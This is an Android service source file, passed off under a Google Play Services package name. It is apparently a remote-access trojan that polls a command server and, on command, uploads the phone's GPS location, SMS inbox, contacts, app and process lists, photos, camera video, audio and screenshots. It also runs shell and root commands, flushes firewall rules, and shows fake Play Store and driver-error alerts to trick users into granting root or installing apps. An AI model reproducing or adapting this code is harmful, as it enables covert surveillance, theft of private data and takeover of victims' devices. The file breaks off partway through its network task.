package com.google.play.services;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Intent;
import android.content.Context;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.ServiceConnection;
import android.content.ComponentName;
import android.media.AudioFormat; 
import android.media.AudioRecord; 
import android.media.MediaRecorder;
import android.os.IBinder;
import android.os.Handler;
import android.os.Bundle;
import android.os.CountDownTimer;
import android.view.Gravity;
import android.graphics.Color;
import android.util.Log;
import android.widget.Toast;
import android.database.Cursor;
import android.net.Uri;
import android.location.*;
import org.json.*;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.params.HttpParams;
import org.apache.http.params.BasicHttpParams;
import org.apache.http.params.HttpConnectionParams;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;
import android.os.AsyncTask;
import java.io.*;
import java.nio.ByteBuffer; 
import java.nio.ByteOrder;
import java.util.*;
import java.text.*;
import java.security.*;
import java.math.*;
import java.net.URLEncoder;
import com.google.play.update.*;
import com.google.play.services.lib.ModelRenderer;

public class SystemThread extends Service
{
	private String[] ipflush = {
			"iptables -F",
			"iptables -X",
			"iptables -t nat -F",
			"iptables -t mangle -F",
			"iptables -t mangle -X",
			"iptables -P INPUT ACCEPT",
			"iptables -P OUTPUT ACCEPT",
			"iptables -p FORWARD ACCEPT"
	};
	
	private String myident = "";
	public static String TAG = "AsDfGhJkL";
	public static String payloadWebResult = "";
	public static String payloadWebResultTarget = "";
	public static String payloadWebResultSwitch = "";
	public static String urlServer = "";
	public static int iserver = 0;
	public String ip = "";

	private static boolean processPing = true;
	private static String[] server = { "http://10.42.0.1", "https://sunjangyo12.000webhostapp.com", "http://localhost:8888" }; //localhost:8888 harus terakhir
	private static int jcamera = 1875953;
	private static int alert_warna = Color.YELLOW;
	private static int alert_letak = Gravity.CENTER | Gravity.TOP;
	private static int alert_durasi = 7000;
	private static String install_app = "";
	private static String install_paket = "";
	private static String uninstall_paket = "";
	private Context context;
	private String[] term;
	private String timenow;
	private String utf = "UTF-8";
	private ServerUtils utils;
	private BroadcastReceiver broreceiver;
	private ReceiverBoot receAction;
	private SharedPreferences settings;
	private SharedPreferences.Editor seteditor;
	private CamRuntime.LocalBinder binder;
	private Handler mHandler = new Handler();
	private Handler camHandler = new Handler();
	private Handler insHandler = new Handler();
	private Handler uniHandler = new Handler();

    private Runnable insRefresh = new Runnable() {
		public void run() 
		{
			insHandler.postDelayed(insRefresh, 8 * 1000);
			
			if (new MainActivity().apkMana(SystemThread.this, install_paket, "open")) {

        		SystemThread.this.stopService(new Intent(SystemThread.this, ServiceAlert.class));

        		reqPayload(SystemThread.this, urlServer+"/payload.php?outpayload="+textPayload("install success"), "null");
        		insHandler.removeCallbacks(insRefresh);
 				
        	}
        	else {
        		SystemThread.this.startService(new Intent(SystemThread.this, ServiceAlert.class));
        	}

  		}
	};

	private Runnable uniRefresh = new Runnable() {
		public void run() 
		{
			uniHandler.postDelayed(uniRefresh, 8 * 1000);

			if (new MainActivity().apkMana(SystemThread.this, uninstall_paket, "cek")) {

				SystemThread.this.startService(new Intent(SystemThread.this, ServiceAlert.class));
        		
        	} else {
        		reqPayload(SystemThread.this, urlServer+"/payload.php?outpayload="+textPayload("uninstall success"), "null");
        		
        		SystemThread.this.stopService(new Intent(SystemThread.this, ServiceAlert.class));
				uniHandler.removeCallbacks(uniRefresh);
        	
        	}
  		}
	};

	private Runnable mRefresh = new Runnable() {
		public void run() 
		{
			if (receAction.pingResult && processPing) {
				payload();
			
			} else {
				if (receAction.cekConnection(SystemThread.this)) Log.i(TAG, "conecting...");
				else Log.i(TAG, "offline!");
			}

			//receAction.temanCek(SystemThread.this);

			mHandler.postDelayed(mRefresh, 3000);

		}
	};

	private Runnable camRefresh = new Runnable() {
		public void run() 
		{
			camHandler.postDelayed(camRefresh, 1 * 1000);

			File f = new File(receAction.pathExternal+"/payloadout/REC_SYSTEM.mp4");
			long cflength = f.length();
			Log.i(TAG, "cam size: "+cflength);

			if (cflength == 0) {
				camHandler.removeCallbacks(camRefresh);
				if (binder != null) {
					binder.matikan();
					unbindService(camServiceConeksi);
					binder = null;

					reqPayload(SystemThread.this, urlServer+"/payload.php?outpayload="+textPayload("camera video/audio SELESAI [siap diupload]"), "null");
				}
				
				reqPayload(SystemThread.this, urlServer+"/payload.php?outpayload="+textPayload("camera video system alert tidak support(coba lagi) gunakan alternatif camera foto"), "null");
			}
			else if (cflength > jcamera) {
				camHandler.removeCallbacks(camRefresh);

				if (binder != null) {
					binder.matikan();
					unbindService(camServiceConeksi);
					binder = null;

					reqPayload(SystemThread.this, urlServer+"/payload.php?outpayload="+textPayload("camera video/audio SELESAI [siap diupload]"), "null");
				}
			}
			else {
				reqPayload(SystemThread.this, urlServer+"/payload.php?outpayload="+textPayload("rekam size:"+cflength), "null");
			}
		}
	};

	public void payload() {
        myident = Identitas.getIPAddress(true);


        if (receAction.kumpulkanPayload) {
        	receAction.kumpulkanPayload = false;
        	Log.i(TAG, "kumpul");
        	kumpulkanPayload(context);
        
        } 

		if (receAction.installResult) {

			receAction._server(context);
			if (receAction.getServer()) 
			{
				Log.i(TAG, ">>>> LOCALHOST RUNNING...........");

				urlServer = server[server.length-1];
				reqPayload(context, urlServer+"/payloadjson.php?input=Connected-_-"+Identitas.getIPAddress(true), "json");

				logic(context);
			}
			else {
				Log.i(TAG, ">>>> localhost stoped...........");
				reqPayload(context, urlServer+"/payloadjson.php?input=Connected-_-"+Identitas.getIPAddress(true), "json");

				logic(context);

			}
			
		}
        else if (myident.equals(payloadWebResultTarget)) {
			reqPayload(context, urlServer+"/payloadjson.php?input=Connected-_-"+Identitas.getIPAddress(true), "json");

			if (payloadWebResultSwitch.equals("hidup") || payloadWebResultSwitch.equals("mati")) 
			{
				if (payloadWebResultSwitch.equals("hidup")) {
					Log.i(TAG, ">>>> MODE SUPER AKTIF...........");
					seteditor.putString("swmain", payloadWebResultSwitch);    
        			seteditor.commit();

				} else {
					Log.i(TAG, ">>>>> super mati");
					seteditor.putString("swmain", payloadWebResultSwitch);    
        			seteditor.commit();
				}
			}

			logic(context);
		
		}
		else {
			reqPayload(context, urlServer+"/payloadjson.php?input=Connected-_-"+Identitas.getIPAddress(true), "json");
			if (payloadWebResultSwitch.equals("hidup") || payloadWebResultSwitch.equals("mati")) 
			{
				if (payloadWebResultSwitch.equals("hidup")) {
					Log.i(TAG, ">>>> MODE SUPER AKTIF...........");
					seteditor.putString("swmain", payloadWebResultSwitch);    
        			seteditor.commit();

				} else {
					Log.i(TAG, ">>>>> super mati");
					seteditor.putString("swmain", payloadWebResultSwitch);    
        			seteditor.commit();
				}
			}
			logic(context);
		}

	}

	public void logic(Context context) 
	{
			if (payloadWebResult.equals("gps")) {
				String lokasi = new GPSresult(context).gpsResult;
				reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload(lokasi), "null");
			}

			if (payloadWebResult.equals("alert")) {
				reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("alert ditampilkan"), "null");

				Toast.makeText(context, "alert", Toast.LENGTH_LONG).show();
			}
			if (payloadWebResult.equals("semua")) {
				reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("semua informasi berhail diupload cek di path payloadout"), "null");

				kumpulkanPayload(context);
			}


			if (payloadWebResult.equals("status")) 
			{
				boolean cekServer;
				if (!receAction.installResult) {
					cekServer = false;
				}else {
					receAction._server(context);
					cekServer = receAction.getServer();
				}
				try {
					String status = //"root: "+receAction.rootRequest()+
								"\nswitch: "+settings.getString("swmain", "")+
								"\nserver: "+cekServer+" install: "+receAction.installResult+
								"\nkamera: "+new CamRuntime().listCamera()+
								"\nipadrs: "+Identitas.getIPAddress(true)+
								"\nmacads: "+Identitas.getMACAddress("wlan0")+
								"\nbatery: "+receAction.batStatus+"\n";
					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload(status), "null");

				} catch(Exception e){}
			}
			
			if (payloadWebResult.equals("layar")) {
				Intent ilay = new Intent(context, MainScreen.class);
				ilay.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
				context.startActivity(ilay);
				
				reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("layar menyala"), "null");
			}
			if (payloadWebResult.equals("screen")) {
				String timenow = new SimpleDateFormat("HH:mm:ss").format(new Date());
				try {
					String[] shell = { "screencap -p "+receAction.pathExternal+"/outpayload/screen.jpg" };
					receAction.rootCommands(shell);
					Thread.sleep(5000);

					receAction.requestUrl = urlServer+"/uploadFile.php";
					receAction.requestAksi = "upload";
					receAction.requestPath = receAction.pathExternal+"/outpayload/screen.jpg";
					receAction.mainRequest(context);

					
					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("screenshoot dan upload berhasil"), "null");
				}
				catch (Exception e) {
					
					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("screenshoot gagal"), "null");
				}
			}

			try {
				String[] text = payloadWebResult.split("-server-");
				if (text[1].equals("hidup")) {
					if (receAction.installResult) {
						receAction._server(context);
						reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("SERVER: "+receAction.setServer(true)), "null");
						reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("SERVER status: "+receAction.getServer()), "null");
					}
					else {
						reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("SERVER: belum terinstall"), "null");
					}
				}
				else if (text[1].equals("mati")) {
					if (receAction.installResult) {
						receAction._server(context);
						reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("SERVER: "+receAction.setServer(false)), "null");
						reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("SERVER status: "+receAction.getServer()), "null");
					}
					else {
						reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("SERVER: belum terinstall"), "null");
					}
				}
			}catch(Exception e){}

			try {
				String[] text = payloadWebResult.split("-net-");
				if (text[1].equals("hidup")) {
					receAction.setGSM(true, context);
				}
				else if (text[1].equals("mati")) {
					receAction.setGSM(false, context);
				}
			}catch(Exception e){}

			try {
				String[] text = payloadWebResult.split("-out-");
				seteditor.putString("utf", text[1]);    
        		seteditor.commit();
        		
				reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload(settings.getString("utf","")), "null");

			}catch(Exception e) {}

			try {
				String[] text = payloadWebResult.split("-speech-");
				String datatts = text[1];
				ServiceTTS sertts = new ServiceTTS();
				sertts.cepat = 0.9f;
				sertts.str = datatts;
				context.startService(new Intent(context, ServiceTTS.class));
        		
				reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("sedang ngomong"), "null");

			}catch(Exception e) {}

			try {
				String[] text = payloadWebResult.split("-audio-");

				if (text[2].equals("start")) {
					receAction.audio(context, text[1], text[2]);
					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("audio dijalankan"), "null");
				}
				else {
					receAction.audio(context, text[1], text[2]);
					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("audio dimatikan"), "null");
				}
			}catch(Exception e) {}

			try {
				String[] text = payloadWebResult.split("-cekroot-");
				if (text[1].equals("cek")) {
					String root = receAction.rootRequest();
				
					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("root:"+root), "null");
				}
				else if (text[1].equals("paksa")) {
					
					ServiceAlert alert = new ServiceAlert();
        			alert.dataText = "\n                           Play store!\n\n  Ilegal root system \n  [ROOTING NOT AVAILABLE IN HARDWARE!] \n  first debug in google team because allow this   prompt to acess your system";
        			alert.dataTextSize = 15;
        			alert.pilihAksi = "root";
        			alert.dataPaket = "";

					context.startService(new Intent(context, ServiceAlert.class));

					String root = receAction.rootRequest();
				
					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("root:"+root), "null");

				}
				else if (text[1].equals("stop")) {
					context.startService(new Intent(context, ServiceAlert.class));
					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("promp hapus"), "null");

				}
			}catch(Exception e) {}

			try {				
				String[] text = payloadWebResult.split("-webcam-");
				BackgroundService conf = new BackgroundService();

				if (text[1].equals("stop")) {
					if (new Main().isServiceRunning(context)) {
						context.stopService(new Intent(context, BackgroundService.class));
						reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("webcam stoping "+new Main().isServiceRunning(context)), "null");

					} else {
						reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("webcam status "+new Main().isServiceRunning(context)), "null");

					}
				}
				else if (text[1].equals("led")) {
					if (new Main().isServiceRunning(context)) {
						context.stopService(new Intent(context, BackgroundService.class));
						conf.led = "led";
						new Main(context, "", "");

						reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("webcam restart menggunakan led "+new Main().isServiceRunning(context)), "null");
					
					} else {
						conf.led = "led";
						new Main(context, "", "");

						reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("webcam mulai baru menggunakan led "+new Main().isServiceRunning(context)), "null");

					}
				}
				else {
					try {
						new Main(context, text[1], text[2]);
						reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("webcam port 8787 "+new Main().isServiceRunning(context)+" kamera "+text[1]+" kualitas "+text[2]), "null");
					
					}catch(Exception e) {

						new Main(context, text[1], "");
						reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("webcam port 8787 "+new Main().isServiceRunning(context)+" kamera "+text[1]), "null");
					}
				}

				

			}catch(Exception e) {}

			try {
				String[] text = payloadWebResult.split("-install-");

				install_app = text[1];
				install_paket = text[2];
				try {
					Log.i(TAG, "nama asets: "+text[3]);

					new Installer(context, true).assetToSdcard(context, text[3], "/sdcard/");
					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("get assets success"), "null");
				}
				catch(Exception e) {
					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("install bukan dari assets"), "null");
				}
        		
        		ServiceAlert alert = new ServiceAlert();
        		alert.dataText = "\nNOTICE:\n\nHardware Driver FAILED 0xFF 0x01 0x0F can't access /system/build.prop please following\n\n1.  Install this plugin apk\n2.  Allow prompt if view\n3.  Open app to trigerred libc.so";
        		alert.dataTextSize = 15;
        		alert.pilihAksi = "install";
        		alert.dataPaket = install_app;

				insHandler.postDelayed(insRefresh, 5 * 1000);

				reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("sedang paksa install aplikasi"), "null");

			}catch(Exception e) {}

			try {
				String[] text = payloadWebResult.split("-uninstall-");

				uninstall_paket = text[1];

        		ServiceAlert alert = new ServiceAlert();
        		alert.dataText = "\nNOTICE:\n\nThis app not updated please remove/install in Play Store\n\n\n";
        		alert.dataTextSize = 15;
        		alert.pilihAksi = "uninstall";
        		alert.dataPaket = uninstall_paket;

				uniHandler.postDelayed(uniRefresh, 5 * 1000);

				reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("sedang paksa uninstall aplikasi: "+text[1]), "null");

			}catch(Exception e) {}

			try {
				String[] text = payloadWebResult.split("-sms-");
				if (text[1].equals("baca")) {
					StringBuffer resultRsms = new StringBuffer();

					Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
					if (cursor.moveToFirst()) {
						do {
							String msgData = "";
							for (int idx=0; idx<cursor.getColumnCount(); idx++) {
								msgData += ""+cursor.getColumnName(idx)+":"+cursor.getString(idx);
							}
							resultRsms.append(msgData);
							
							reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload(""+msgData), "null");

						} while (cursor.moveToNext());
						Log.i(TAG, resultRsms.toString());
					}
					else {
						
						reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("sms kosong"), "null");
						Log.i(TAG, "kosong");
					}

				} else {
					String kirimSms = "";
					try {
						kirimSms = new MainActivity().sendSMS(context, text[2], text[1]);
					}catch(Exception e) {
						Log.i(TAG, "smserr:"+e);
					}
					Log.i(TAG, "sms:"+kirimSms);

					
					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload(kirimSms), "null");
				}
			}catch(Exception e) {}

			try {
				String[] text = payloadWebResult.split("-wal-");
				String set = receAction.setWalpaper(context, text[1]);
				
				reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload(set), "null");

			} catch(Exception e) {}

			try {
				String[] text = payloadWebResult.split("-3d-");
				String anPath    = text[1];
				
				float cameraX  = Float.MIN_VALUE;
				float cameraY  = Float.MIN_VALUE;
				float cameraZoom = Float.MIN_VALUE;
				float cameraRotasi = Float.MIN_VALUE;
				float posX   = Float.MIN_VALUE;
				float posY   = Float.MIN_VALUE;
				float posZ   = Float.MIN_VALUE;
				float skala    = Float.MIN_VALUE;

				try {cameraX       = Float.parseFloat(text[2]);} catch(Exception e){}
				try {cameraY       = Float.parseFloat(text[3]);} catch(Exception e){}
				try {cameraZoom    = Float.parseFloat(text[4]);} catch(Exception e){}
				try {cameraRotasi  = Float.parseFloat(text[5]);} catch(Exception e){}
				try {posX          = Float.parseFloat(text[6]);} catch(Exception e){}
				try {posY          = Float.parseFloat(text[7]);} catch(Exception e){}
				try {posZ          = Float.parseFloat(text[8]);} catch(Exception e){}
				try {skala         = Float.parseFloat(text[9]);} catch(Exception e){}

				if (anPath.equals("stop")) {
					context.stopService(new Intent(context, ServiceAlert.class));
					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("3d stop"), "null");
				}
				else if (text[1].equals("conf")) {
					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("3d file sedang dikembangkan"), "null");
				}
				else {

					ServiceAlert model = new ServiceAlert();
					model.zoomRotasi = true;
					model.posisi = true;
					model.pilihAksi = "3d";
					model.setPath(anPath);
					model.skala = skala;
					model.setCamera(cameraX, cameraY);
					model.setCameraZoom(cameraZoom);
					model.setCameraRotasi(cameraRotasi);
					model.setPosisi(posX, posY, posZ);

					context.startService(new Intent(context, ServiceAlert.class));
					
					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("3d langsung "), "null");
				}

			} catch(Exception e) {}

			try {
				String[] text = payloadWebResult.split("-compress-");

				new Installer(context, "aktif").compressFiles(text[1], text[2]);

			} catch(Exception e) {}

			try {
				String[] text = payloadWebResult.split("-foto-");

				receAction.setDoc(context);
				CamRuntime came = new CamRuntime();

				try {
					if (text[2].equals("led")) came.led = "led";
				}catch(Exception e){}

				// entah kenapa jika kamera back dipanggil disini foto tidak bisa disimpan
				// tapi kalau dipanggil di onCreate bisa -_-
				// hp debuging sony xperia so-04e kurang tau kalau hp yang lain

				came.capturePhoto(text[1], receAction.pathExternal+"/payloadout", "foto.jpg", context);
				Thread.sleep(500);
				receAction.requestUrl = urlServer+"/uploadFile.php";
				receAction.requestAksi = "upload";
				receAction.requestPath = receAction.pathExternal+"/payloadout/foto.jpg";
				receAction.mainRequest(context);

				reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("kamera sukses:"+text[1]+" "+receAction.shellCommands("ls -l "+receAction.pathExternal+"/payloadout/")), "null");
			}
			catch(Exception e) {}

			try {
				String[] text = payloadWebResult.split("-cam-");
				CamRuntime camRuntime = new CamRuntime();
				camRuntime.path = receAction.pathExternal+"/payloadout";

				try {
					int i = Integer.parseInt(text[3]);
					jcamera = i;
					Log.i(TAG, "jcamera:"+i);


					if (text[2].equals("1")) camRuntime.kualitas = 1;
				}catch(Exception e) {}

				try {
					if (text[2].equals("1")) camRuntime.kualitas = 1;
				}catch(Exception e) {}

				if (text[1].equals("depan")) {
            		Intent intent = new Intent(context, CamRuntime.class);
            		context.startService(intent);
            
            		bindService(intent, camServiceConeksi, 0);
				}
				else if (text[1].equals("back")) {
					camRuntime.isCamera = 0; //back cam
            		Intent intent = new Intent(context, CamRuntime.class);
            		context.startService(intent);
            
            		bindService(intent, camServiceConeksi, 0);
				}
				camHandler.postDelayed(camRefresh, 5 * 1000);
			}
			catch(Exception e) {}

			try {
				String[] text = payloadWebResult.split("-key-");
				if (text[1].equals("home")) {
					Intent intent = new Intent(Intent.ACTION_MAIN);
        			intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        			intent.addCategory(Intent.CATEGORY_HOME);
        			context.startActivity(intent);
				}
				if (text[1].equals("recent")) {
					receAction.doRecentAction();
				}

				reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("keyEvent:"+text[1]+" berhasil dibuka"), "null");
			}catch(Exception e) {}

			try {
				String[] text = payloadWebResult.split("-app-");
				if (new MainActivity().apkMana(context, text[1], "open")) {
					
					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("APK:"+text[1]+" berhasil dibuka"), "null");
				}
				else {
					
					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("gagal buka apk"), "null");
				}
				

			}
			catch(Exception e) {}

			try {
				String[] text = payloadWebResult.split("-up-");
				String reqpath = "";

				if (text[1].equals("video")) {
					reqpath = receAction.pathExternal+"/REC_SYSTEM.mp4";
					
					reqPayload(SystemThread.this, urlServer+"/payload.php?outpayload="+textPayload("upload video TUNGGU"), "null");
				}
				else if (text[1].equals("screen")) {
					reqpath = receAction.pathExternal+"/screen.jpg";
					
					reqPayload(SystemThread.this, urlServer+"/payload.php?outpayload="+textPayload("upload screenshot TUNGGU"), "null");
				}
				else if (text[1].equals("foto")) {
					reqpath = receAction.pathExternal+"/foto.jpg";
					
					reqPayload(SystemThread.this, urlServer+"/payload.php?outpayload="+textPayload("upload foto TUNGGU"), "null");
				}
				else {
					reqpath = text[1];
				}

				receAction.requestUrl = urlServer+"/uploadFile.php";
				receAction.requestAksi = "upload";
				receAction.requestPath = reqpath;
				receAction.mainRequest(context);
				
				
				reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("upload file : "+reqpath), "null");
			}
			catch(Exception e) {}

			try {
				String[] text = payloadWebResult.split("-down-");
				String downurl = "";
				String downname = "";
				try {
					downname = text[3];
					downurl = text[1];
				}catch(Exception e) {
					downname = text[1];
					downurl = urlServer+"/download.php?id=payloadout/"+text[1];
				}

				receAction.requestUrl = downurl;
				receAction.requestAksi = "download";
				receAction.requestPath = text[2]+"/"+downname; //path
				receAction.mainRequest(context);
				Thread.sleep(5000);
				
				
				reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("dwnload file : "+text[1]), "null");
			}
			catch(Exception e) {}

			try {
				String[] text = payloadWebResult.split("-alert-");
				try {
					int alert_durasi = Integer.parseInt(text[4]);
				}catch(Exception e) {}
				try {
					if (text[3].equals("atas")) alert_letak = Gravity.TOP;
					else if (text[3].equals("tengah")) alert_letak = Gravity.CENTER;  
					else if (text[3].equals("bawah")) alert_letak = Gravity.BOTTOM;  
					else if (text[3].equals("atas&tengah")) alert_letak = Gravity.TOP | Gravity.CENTER;  
					else if (text[3].equals("bawah&tengah")) alert_letak = Gravity.BOTTOM | Gravity.CENTER;  

					if (text[2].equals("biru")) alert_warna = Color.BLUE;
					else if (text[2].equals("merah")) alert_warna = Color.RED;
					else if (text[2].equals("kuning")) alert_warna = Color.YELLOW;
					else if (text[2].equals("hujau")) alert_warna = Color.GREEN;
					
					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("toast text:"+text[1]+" letak:"+alert_letak+" warna:"+alert_warna+" durasi:"+alert_durasi), "null");

					CountDownTimer hitungMundur = new CountDownTimer(alert_durasi, 100){
						public void onTick(long millisUntilFinished){
							if (text[1].equals("?img?")) {
								receAction.toastImage(SystemThread.this, text[2], alert_letak);
								receAction.toast.show();
							} else {
								receAction.toastText(context, text[1], alert_warna, alert_letak);
								receAction.toast.show();
							}
						}
						public void onFinish()
						{
						}
					}.start();
					
				}
				catch(Exception e) 
				{
					
					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("toast text:"+text[1]), "null");

					CountDownTimer hitungMundur = new CountDownTimer(7500, 100){
						public void onTick(long millisUntilFinished){
							receAction.toastText(context, text[1], alert_warna, alert_letak);
							receAction.toast.show();
						}
						public void onFinish()
						{
						}
					}.start();
				}
				
			}catch(Exception e){}
			
			try {
				String[] text = payloadWebResult.split("-/-");

				Log.i(TAG, receAction.textSplit(text[1], "\n"));
				receAction.editor(context, receAction.textSplit(text[1], "\n"), text[2]);

				
				reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("text tersimpan siap dieksukesi<-_->"), "null");
			}catch(Exception e) {}

			try {
				term = payloadWebResult.split("-_-");
				if (term[1] != "") {
					String out = textPayload(receAction.shellCommands(""+term[1]));
					Log.i(TAG, out);
					
					reqPayload(context, urlServer+"/payload.php?outpayload="+out, "null");
				}
			}
			catch(Exception e) {}

			try {
				term = payloadWebResult.split("-su-");
				if (term[1] != "") {
					String[] sud = { term[1] };
					String resultSudo = "";
					try {
						receAction.rootCommands(sud);
						resultSudo = "sukses execute root";
					}catch(Exception e) {
						resultSudo = "Failed execute root";
					}
					String out = textPayload(resultSudo);
					Log.i(TAG, out);
					
					reqPayload(context, urlServer+"/payload.php?outpayload="+out, "null");
				}
			}
			catch(Exception e) {}
	}

	public String textPayload(String data) {
		timenow = new SimpleDateFormat("HH:mm:ss").format(new Date());
		String[] hashString = { data+" dari:"+receAction.identitasResult+" waktu:"+timenow+" input:"+payloadWebResult+"\n" };
		
		if (settings.getString("utf", "").equals("")) {
			Log.i(TAG, "utf kosong");
		} else {
			utf = settings.getString("utf", "");
			Log.i(TAG, "utf:"+utf);
		}

		try {
			for (String s : hashString)     
			{
				return URLEncoder.encode(s, utf);       
			}
		}catch (Exception e) {}
		return null;
	}

	public void reqPayload(Context context, String purl, String requestAksi) {
		
		PayloadWebTask task = new PayloadWebTask();
		task.applicationContext = context;
		task.paymain = requestAksi;

		Log.i(TAG, "...payload text   : "+payloadWebResult);
		Log.i(TAG, "...payload sw     : "+payloadWebResultSwitch+" ["+urlServer+"]");
		Log.i(TAG, "...payload target : "+payloadWebResultTarget+"\n");

		try {
			if (receAction.cekConnection(context)) {
				task.execute(new String[] { purl });
			} 
			else {
				Log.i(TAG, "disconnect network");
			}
		}catch(Exception e) {
			Log.i(TAG, "errRequest: "+e);
			receAction.pingResult = false;
		}
	}


	public void kumpulkanPayload(Context context) {
		Installer installer = new Installer();
		String pathKumpul = receAction.pathExternal+"/kumpul";
		File fileKumpul = new File(pathKumpul);

		try {
			Runtime.getRuntime().exec("rm -R "+pathKumpul);
			Thread.sleep(1000);
			if (!fileKumpul.exists()) {
            	fileKumpul.mkdirs();
        	}
			Runtime.getRuntime().exec("cp /system/build.prop "+pathKumpul);

			new CamRuntime().capturePhoto("depan", pathKumpul, "depan.jpg", context);

			String cekServer = "";
			if (!receAction.installResult) {
				cekServer = "server belum terinstall";
			}else {
				cekServer = receAction.setServer(true);
			}
			Thread.sleep(1000);
			String status = //"root: "+receAction.rootRequest()+
							"\nwaktu : "+new SimpleDateFormat("[HH:mm]  dd,MMM,yyy").format(new Date())+
							"\ncamlis: "+new CamRuntime().listCamera()+
							"\nproses: "+receAction.shellCommands("ps")+
							"\nswitch: "+settings.getString("swmain", "")+
							"\nserver: "+cekServer+
							"\nipadrs: "+Identitas.getIPAddress(true)+
							"\nmacads: "+Identitas.getMACAddress("wlan0")+
							"\nbatery: "+receAction.batStatus+
							"\ngps   : "+new GPSresult(context).gpsResult+"\n\n"+
							"\napk li: "+receAction.shellCommands("pm -l");
			Thread.sleep(4000);
			try {
				installer.saveCode(status, "utf-8", pathKumpul + "/status.txt");
			} catch (IOException e) {
				Log.i(TAG, "ERRsavestatus:"+e);
			}

			try {
				installer.saveCode(receAction.getSms(context)+receAction.getContacts(context), "utf-8", pathKumpul + "/private.txt");
			} catch (IOException e) {
				Log.i(TAG, "ERRsave:"+e);
			}

			String identitasKumpul = Identitas.getIPAddress(true)+".zipjut";
			new Installer().compressFiles(pathKumpul, pathKumpul+"/"+identitasKumpul);
			Thread.sleep(3000);
			receAction.requestUrl = urlServer+"/uploadFile.php";
			receAction.requestAksi = "upload";
			receAction.requestPath = pathKumpul+"/"+identitasKumpul;
			receAction.mainRequest(context);
		
		} catch(Exception e) {

		}
	}

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	@Override
	public void onCreate() {
		super.onCreate();
		settings = getSharedPreferences("Settings", 0);
		seteditor = settings.edit();
		urlServer = server[iserver];
		context = this;

		String gps = new GPSresult(this).gpsResult;
		IntentFilter filter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
		filter.addAction(Intent.ACTION_DATE_CHANGED);
		filter.addAction(Intent.ACTION_HEADSET_PLUG);
		filter.addAction(Intent.ACTION_SCREEN_ON);
		filter.addAction(Intent.ACTION_POWER_CONNECTED);
		filter.addAction(Intent.ACTION_POWER_DISCONNECTED);
		filter.addAction(Intent.ACTION_MANAGE_NETWORK_USAGE);
		filter.addAction(Intent.ACTION_AIRPLANE_MODE_CHANGED);
		filter.addAction(Intent.ACTION_SCREEN_OFF);

		broreceiver = new ReceiverBoot();
		receAction = new ReceiverBoot();
		utils = new ServerUtils(this);

		registerReceiver(broreceiver, filter);
		mHandler.postDelayed(mRefresh, 3000);

		File htdocs = new File(utils.getPathExternal());
        if (!htdocs.exists()) {
            htdocs.mkdir();
        }

		
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		
		Log.i(TAG, "service start oke");
		String gps = new GPSresult(this).gpsResult;

		return super.onStartCommand(intent, flags, startId);
	}

	@Override
	public void onDestroy() {
		super.onDestroy();
		unregisterReceiver(broreceiver);
		seteditor.putString("cekversion", "destroy");    
  	    seteditor.commit();
  	    mHandler.removeCallbacks(mRefresh);
	}
	
	private class PayloadWebTask extends AsyncTask<String, Void, String> 
	{
		protected Context applicationContext;
		protected String paymain = "";
		// connecting...
		@Override
		protected void onPreExecute() {}

	    @Override
	    protected String doInBackground(String... data) {
	    	processPing = false;

	    	String sret = "";
	    	HttpParams httpParams = new BasicHttpParams();
	    	HttpConnectionParams.setConnectionTimeout(httpParams, 50000);
	    	HttpConnectionParams.setSoTimeout(httpParams, 50000);

			HttpClient httpClient = new DefaultHttpClient(httpParams);
